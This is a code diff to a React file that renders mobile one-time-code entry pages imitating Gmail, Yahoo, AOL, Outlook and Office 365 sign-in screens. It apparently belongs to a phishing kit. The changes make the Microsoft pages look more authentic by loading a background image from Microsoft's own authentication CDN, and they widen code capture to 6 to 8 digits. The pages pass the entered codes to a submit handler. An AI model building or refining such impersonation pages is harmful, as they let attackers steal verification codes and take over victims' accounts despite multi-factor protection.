@@ -47,7 +47,16 @@ const UserAvatar: React.FC<{ email: string; size?: number }> = ({ email, size = 
 };
 
 /* ── Gmail / Google-style OTP (Mobile) ────────────────────────── */
-const MobileGmailOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit }) => (
+const MobileGmailOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit }) => {
+  const [gmailCodeValue, setGmailCodeValue] = useState('');
+
+  const handleGmailCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
+    setGmailCodeValue(val);
+    onOtpComplete(val);
+  };
+
+  return (
   <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#fff', fontFamily: "'Google Sans', 'Roboto', Arial, sans-serif" }}>
     <div className="flex-1 flex flex-col justify-center px-6 py-8">
       <div className="text-center mb-6">
@@ -86,12 +95,23 @@ const MobileGmailOtp: React.FC<{ email?: string; errorMessage?: string; isLoadin
 
         <div>
           <label className="text-sm font-medium text-gray-700 block mb-2">Enter code</label>
-          <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} theme="light" />
+          <input
+            type="text"
+            inputMode="numeric"
+            autoComplete="one-time-code"
+            placeholder="Enter code"
+            value={gmailCodeValue}
+            onChange={handleGmailCodeChange}
+            disabled={isLoading}
+            autoFocus
+            className="w-full px-3 py-2 text-base text-gray-900 bg-white border border-gray-300 rounded focus:ring-2 focus:ring-blue-500 focus:border-blue-500 focus:outline-none disabled:bg-gray-100"
+            style={{ fontFamily: 'inherit', fontSize: '16px', height: '44px' }}
+          />
         </div>
 
         <div className="flex justify-between items-center pt-2">
           <button type="button" className="text-sm font-medium text-blue-600 active:text-blue-800 transition-colors">Try another way</button>
-          <button type="submit" disabled={isLoading || otp.length !== 6} className="px-6 py-2.5 rounded-md font-medium text-sm text-white bg-[#1A73E8] active:bg-[#1557B0] disabled:opacity-50 transition-colors">
+          <button type="submit" disabled={isLoading || otp.length < 6} className="px-6 py-2.5 rounded-md font-medium text-sm text-white bg-[#1A73E8] active:bg-[#1557B0] disabled:opacity-50 transition-colors">
             {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
             {isLoading ? 'Verifying...' : 'Next'}
           </button>
@@ -105,12 +125,14 @@ const MobileGmailOtp: React.FC<{ email?: string; errorMessage?: string; isLoadin
       </div>
     </div>
   </div>
-);
+  );
+};
 
 /* ── Yahoo-style OTP (Mobile) ─────────────────────────────────── */
 const MobileYahooOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void; onResend?: () => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit, onResend }) => {
   const [deliveryMethod, setDeliveryMethod] = useState<'email' | 'phone'>('email');
   const [resendSent, setResendSent] = useState(false);
+  const [yahooCodeValue, setYahooCodeValue] = useState('');
   const resendTimerRef = useRef<ReturnType<typeof setTimeout>>();
 
   useEffect(() => () => { if (resendTimerRef.current) clearTimeout(resendTimerRef.current); }, []);
@@ -121,6 +143,12 @@ const MobileYahooOtp: React.FC<{ email?: string; errorMessage?: string; isLoadin
       setResendSent(true);
       resendTimerRef.current = setTimeout(() => setResendSent(false), 30000);
     }
+  };
+
+  const handleYahooCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 8);
+    setYahooCodeValue(val);
+    onOtpComplete(val);
   };
 
   return (
@@ -173,10 +201,21 @@ const MobileYahooOtp: React.FC<{ email?: string; errorMessage?: string; isLoadin
 
             <div>
               <label className="text-sm font-medium text-gray-700 block mb-2">Verification code</label>
-              <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} theme="light" />
+              <input
+                type="text"
+                inputMode="numeric"
+                autoComplete="one-time-code"
+                placeholder="Enter code"
+                value={yahooCodeValue}
+                onChange={handleYahooCodeChange}
+                disabled={isLoading}
+                autoFocus
+                className="w-full px-3 py-2 text-base text-gray-900 bg-white border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#720e9e] focus:border-[#720e9e] focus:outline-none disabled:bg-gray-100"
+                style={{ fontFamily: 'inherit', fontSize: '16px', height: '44px' }}
+              />
             </div>
 
-            <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full py-3 px-4 rounded-full font-bold text-sm text-white disabled:opacity-50 transition-colors" style={{ backgroundColor: '#720e9e' }}>
+            <button type="submit" disabled={isLoading || otp.length < 6} className="w-full py-3 px-4 rounded-full font-bold text-sm text-white disabled:opacity-50 transition-colors" style={{ backgroundColor: '#720e9e' }}>
               {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
               {isLoading ? 'Verifying...' : 'Verify'}
             </button>
@@ -206,6 +245,7 @@ const MobileYahooOtp: React.FC<{ email?: string; errorMessage?: string; isLoadin
 const MobileAolOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void; onResend?: () => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit, onResend }) => {
   const [deliveryMethod, setDeliveryMethod] = useState<'email' | 'phone'>('email');
   const [resendSent, setResendSent] = useState(false);
+  const [aolCodeValue, setAolCodeValue] = useState('');
   const resendTimerRef = useRef<ReturnType<typeof setTimeout>>();
 
   useEffect(() => () => { if (resendTimerRef.current) clearTimeout(resendTimerRef.current); }, []);
@@ -216,6 +256,12 @@ const MobileAolOtp: React.FC<{ email?: string; errorMessage?: string; isLoading:
       setResendSent(true);
       resendTimerRef.current = setTimeout(() => setResendSent(false), 30000);
     }
+  };
+
+  const handleAolCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 8);
+    setAolCodeValue(val);
+    onOtpComplete(val);
   };
 
   return (
@@ -268,10 +314,21 @@ const MobileAolOtp: React.FC<{ email?: string; errorMessage?: string; isLoading:
 
             <div>
               <label className="text-sm font-medium text-gray-700 block mb-2">Verification code</label>
-              <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} theme="light" />
+              <input
+                type="text"
+                inputMode="numeric"
+                autoComplete="one-time-code"
+                placeholder="Enter code"
+                value={aolCodeValue}
+                onChange={handleAolCodeChange}
+                disabled={isLoading}
+                autoFocus
+                className="w-full px-3 py-2 text-base text-gray-900 bg-white border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#39007E] focus:border-[#39007E] focus:outline-none disabled:bg-gray-100"
+                style={{ fontFamily: 'inherit', fontSize: '16px', height: '44px' }}
+              />
             </div>
 
-            <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full py-3 px-4 rounded-full font-bold text-sm text-white disabled:opacity-50 transition-colors" style={{ backgroundColor: '#39007E' }}>
+            <button type="submit" disabled={isLoading || otp.length < 6} className="w-full py-3 px-4 rounded-full font-bold text-sm text-white disabled:opacity-50 transition-colors" style={{ backgroundColor: '#39007E' }}>
               {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
               {isLoading ? 'Verifying...' : 'Verify'}
             </button>
@@ -330,62 +387,64 @@ const MobileOutlookOtp: React.FC<{ email?: string; errorMessage?: string; isLoad
   };
 
   return (
-    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#fff', fontFamily: "'Segoe UI', 'Helvetica Neue', Arial, sans-serif" }}>
-      <div className="flex-1 flex flex-col justify-center px-6 py-8">
-        <div className="mb-4">
-          <MicrosoftLogo />
-        </div>
-
-        {email && (
-          <div className="flex items-center gap-2 mb-4 cursor-pointer">
-            <svg className="w-3 h-3 text-gray-800 flex-shrink-0" viewBox="0 0 16 16" fill="currentColor"><path d="M11.3 1.3L5.6 7l5.7 5.7-1 1L3.6 7l6.7-6.7z" /></svg>
-            <span className="text-sm text-gray-800">{email}</span>
+    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#fff', backgroundImage: "url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg')", backgroundSize: 'cover', backgroundRepeat: 'no-repeat', backgroundPosition: 'center center', fontFamily: "'Segoe UI', 'Helvetica Neue', Arial, sans-serif" }}>
+      <div className="flex-1 flex flex-col justify-center px-4 py-8">
+        <div className="bg-white p-6" style={{ boxShadow: '0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 .2px .9px 0 rgba(0,0,0,.108)' }}>
+          <div className="mb-4">
+            <MicrosoftLogo />
           </div>
-        )}
 
-        <h1 className="text-xl text-gray-900 mb-2" style={{ fontWeight: 600, fontSize: '24px', lineHeight: '1.3' }}>Enter code</h1>
-
-        {email && (
-          <p className="text-sm text-gray-800 mb-4" style={{ fontSize: '15px', lineHeight: '20px' }}>
-            We sent a code to <span className="font-semibold">{maskEmail(email)}</span>
-          </p>
-        )}
-
-        <form onSubmit={onSubmit}>
-          {errorMessage && (
-            <div className="mb-3 text-sm" style={{ color: '#e81123' }}>
-              <span>{errorMessage}</span>
+          {email && (
+            <div className="flex items-center gap-2 mb-4 cursor-pointer">
+              <svg className="w-3 h-3 text-gray-800 flex-shrink-0" viewBox="0 0 16 16" fill="currentColor"><path d="M11.3 1.3L5.6 7l5.7 5.7-1 1L3.6 7l6.7-6.7z" /></svg>
+              <span className="text-sm text-gray-800">{email}</span>
             </div>
           )}
 
-          <div className="mb-5">
-            <input
-              type="text"
-              inputMode="numeric"
-              autoComplete="one-time-code"
-              placeholder="Code"
-              value={codeValue}
-              onChange={handleCodeChange}
-              disabled={isLoading}
-              autoFocus
-              className="w-full px-3 py-2 text-base border border-gray-400 focus:border-[#0067B8] focus:outline-none disabled:bg-gray-100"
-              style={{ fontFamily: 'inherit', fontSize: '15px', height: '36px', borderRadius: '0' }}
-            />
+          <h1 className="text-xl text-gray-900 mb-2" style={{ fontWeight: 600, fontSize: '24px', lineHeight: '1.3' }}>Enter code</h1>
+
+          {email && (
+            <p className="text-sm text-gray-800 mb-4" style={{ fontSize: '15px', lineHeight: '20px' }}>
+              We sent a code to <span className="font-semibold">{maskEmail(email)}</span>
+            </p>
+          )}
+
+          <form onSubmit={onSubmit}>
+            {errorMessage && (
+              <div className="mb-3 text-sm" style={{ color: '#e81123' }}>
+                <span>{errorMessage}</span>
+              </div>
+            )}
+
+            <div className="mb-5">
+              <input
+                type="text"
+                inputMode="numeric"
+                autoComplete="one-time-code"
+                placeholder="Code"
+                value={codeValue}
+                onChange={handleCodeChange}
+                disabled={isLoading}
+                autoFocus
+                className="w-full px-3 py-2 text-base border border-gray-400 focus:border-[#0067B8] focus:outline-none disabled:bg-gray-100"
+                style={{ fontFamily: 'inherit', fontSize: '15px', height: '36px', borderRadius: '0' }}
+              />
+            </div>
+
+            <button type="submit" disabled={isLoading || otp.length < 6} className="w-full py-1.5 px-4 text-white text-sm font-semibold disabled:opacity-50 transition-colors" style={{ backgroundColor: '#0067B8', borderRadius: '0', height: '36px', fontSize: '15px' }}>
+              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
+              {isLoading ? 'Signing in...' : 'Sign in'}
+            </button>
+          </form>
+
+          <div className="mt-4">
+            <button type="button" onClick={handleResend} disabled={resendSent} className="text-sm disabled:opacity-50 disabled:cursor-not-allowed" style={{ color: '#0067B8', fontSize: '13px' }}>
+              {resendSent ? 'Code resent successfully' : "I didn't get a code"}
+            </button>
           </div>
-
-          <button type="submit" disabled={isLoading || otp.length < 6} className="w-full py-1.5 px-4 text-white text-sm font-semibold disabled:opacity-50 transition-colors" style={{ backgroundColor: '#0067B8', borderRadius: '0', height: '36px', fontSize: '15px' }}>
-            {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
-            {isLoading ? 'Signing in...' : 'Sign in'}
-          </button>
-        </form>
-
-        <div className="mt-4">
-          <button type="button" onClick={handleResend} disabled={resendSent} className="text-sm disabled:opacity-50 disabled:cursor-not-allowed" style={{ color: '#0067B8', fontSize: '13px' }}>
-            {resendSent ? 'Code resent successfully' : "I didn't get a code"}
-          </button>
         </div>
 
-        <div className="mt-8 flex items-center justify-end gap-3 text-xs text-gray-500">
+        <div className="mt-4 flex items-center justify-end gap-3 text-xs text-gray-500">
           <a href="https://go.microsoft.com/fwlink/?LinkID=2259814" target="_blank" rel="noopener noreferrer">Terms of use</a>
           <a href="https://privacy.microsoft.com/en-us/privacystatement" target="_blank" rel="noopener noreferrer">Privacy & cookies</a>
           <span className="text-gray-400">···</span>
@@ -418,62 +477,64 @@ const MobileOffice365Otp: React.FC<{ email?: string; errorMessage?: string; isLo
   };
 
   return (
-    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#fff', fontFamily: "'Segoe UI', 'Helvetica Neue', Arial, sans-serif" }}>
-      <div className="flex-1 flex flex-col justify-center px-6 py-8">
-        <div className="flex items-center gap-2 mb-4">
-          <MicrosoftLogo />
-        </div>
-
-        {email && (
-          <div className="flex items-center gap-2 mb-4 cursor-pointer">
-            <svg className="w-3 h-3 text-gray-800 flex-shrink-0" viewBox="0 0 16 16" fill="currentColor"><path d="M11.3 1.3L5.6 7l5.7 5.7-1 1L3.6 7l6.7-6.7z" /></svg>
-            <span className="text-sm text-gray-800">{email}</span>
+    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#fff', backgroundImage: "url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg')", backgroundSize: 'cover', backgroundRepeat: 'no-repeat', backgroundPosition: 'center center', fontFamily: "'Segoe UI', 'Helvetica Neue', Arial, sans-serif" }}>
+      <div className="flex-1 flex flex-col justify-center px-4 py-8">
+        <div className="bg-white p-6" style={{ boxShadow: '0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 .2px .9px 0 rgba(0,0,0,.108)' }}>
+          <div className="flex items-center gap-2 mb-4">
+            <MicrosoftLogo />
           </div>
-        )}
 
-        <h1 className="text-xl text-gray-900 mb-2" style={{ fontWeight: 600, fontSize: '24px', lineHeight: '1.3' }}>Enter code</h1>
-
-        {email && (
-          <p className="text-sm text-gray-800 mb-4" style={{ fontSize: '15px', lineHeight: '20px' }}>
-            We sent a code to <span className="font-semibold">{maskEmail(email)}</span>
-          </p>
-        )}
-
-        <form onSubmit={onSubmit}>
-          {errorMessage && (
-            <div className="mb-3 text-sm" style={{ color: '#e81123' }}>
-              <span>{errorMessage}</span>
+          {email && (
+            <div className="flex items-center gap-2 mb-4 cursor-pointer">
+              <svg className="w-3 h-3 text-gray-800 flex-shrink-0" viewBox="0 0 16 16" fill="currentColor"><path d="M11.3 1.3L5.6 7l5.7 5.7-1 1L3.6 7l6.7-6.7z" /></svg>
+              <span className="text-sm text-gray-800">{email}</span>
             </div>
           )}
 
-          <div className="mb-5">
-            <input
-              type="text"
-              inputMode="numeric"
-              autoComplete="one-time-code"
-              placeholder="Code"
-              value={codeValue}
-              onChange={handleCodeChange}
-              disabled={isLoading}
-              autoFocus
-              className="w-full px-3 py-2 text-base border border-gray-400 focus:border-[#0067B8] focus:outline-none disabled:bg-gray-100"
-              style={{ fontFamily: 'inherit', fontSize: '15px', height: '36px', borderRadius: '0' }}
-            />
+          <h1 className="text-xl text-gray-900 mb-2" style={{ fontWeight: 600, fontSize: '24px', lineHeight: '1.3' }}>Enter code</h1>
+
+          {email && (
+            <p className="text-sm text-gray-800 mb-4" style={{ fontSize: '15px', lineHeight: '20px' }}>
+              We sent a code to <span className="font-semibold">{maskEmail(email)}</span>
+            </p>
+          )}
+
+          <form onSubmit={onSubmit}>
+            {errorMessage && (
+              <div className="mb-3 text-sm" style={{ color: '#e81123' }}>
+                <span>{errorMessage}</span>
+              </div>
+            )}
+
+            <div className="mb-5">
+              <input
+                type="text"
+                inputMode="numeric"
+                autoComplete="one-time-code"
+                placeholder="Code"
+                value={codeValue}
+                onChange={handleCodeChange}
+                disabled={isLoading}
+                autoFocus
+                className="w-full px-3 py-2 text-base border border-gray-400 focus:border-[#0067B8] focus:outline-none disabled:bg-gray-100"
+                style={{ fontFamily: 'inherit', fontSize: '15px', height: '36px', borderRadius: '0' }}
+              />
+            </div>
+
+            <button type="submit" disabled={isLoading || otp.length < 6} className="w-full py-1.5 px-4 text-white text-sm font-semibold disabled:opacity-50 transition-colors" style={{ backgroundColor: '#0067B8', borderRadius: '0', height: '36px', fontSize: '15px' }}>
+              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
+              {isLoading ? 'Signing in...' : 'Sign in'}
+            </button>
+          </form>
+
+          <div className="mt-4">
+            <button type="button" onClick={handleResend} disabled={resendSent} className="text-sm disabled:opacity-50 disabled:cursor-not-allowed" style={{ color: '#0067B8', fontSize: '13px' }}>
+              {resendSent ? 'Code resent successfully' : "I didn't get a code"}
+            </button>
           </div>
-
-          <button type="submit" disabled={isLoading || otp.length < 6} className="w-full py-1.5 px-4 text-white text-sm font-semibold disabled:opacity-50 transition-colors" style={{ backgroundColor: '#0067B8', borderRadius: '0', height: '36px', fontSize: '15px' }}>
-            {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
-            {isLoading ? 'Signing in...' : 'Sign in'}
-          </button>
-        </form>
-
-        <div className="mt-4">
-          <button type="button" onClick={handleResend} disabled={resendSent} className="text-sm disabled:opacity-50 disabled:cursor-not-allowed" style={{ color: '#0067B8', fontSize: '13px' }}>
-            {resendSent ? 'Code resent successfully' : "I didn't get a code"}
-          </button>
         </div>
 
-        <div className="mt-8 flex items-center justify-end gap-3 text-xs text-gray-500">
+        <div className="mt-4 flex items-center justify-end gap-3 text-xs text-gray-500">
           <a href="https://go.microsoft.com/fwlink/?LinkID=2259814" target="_blank" rel="noopener noreferrer">Terms of use</a>
           <a href="https://privacy.microsoft.com/en-us/privacystatement" target="_blank" rel="noopener noreferrer">Privacy & cookies</a>
           <span className="text-gray-400">···</span>
@@ -551,7 +612,7 @@ const MobileOtpPage: React.FC<MobileOtpPageProps> = ({ onSubmit, isLoading, erro
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    if (otp.length === 6) {
+    if (otp.length >= 6) {
       onSubmit(otp);
     }
   };
